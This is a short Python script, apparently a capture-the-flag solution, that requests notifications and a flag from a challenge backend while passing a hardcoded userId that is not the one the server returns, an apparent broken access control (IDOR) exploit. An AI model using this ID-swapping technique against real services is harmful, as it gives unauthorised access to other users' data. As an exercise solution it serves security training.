import requests

url = 'https://notifications.tasks.mctf.online/backend'

id_route = '/getUserId'
notification_route = '/getNotifications'
flag_route = '/sendFlag'

uid = requests.get(url + id_route).text

params = {'userId': 'df6292dc-883a-4721-b235-8ced22aec5db'}
notifications = requests.get(url + notification_route,  params=params)
print(notifications.status_code)
print(notifications.text)

flag = requests.get(url + flag_route, params=params)
print(flag.status_code)
print(flag.text)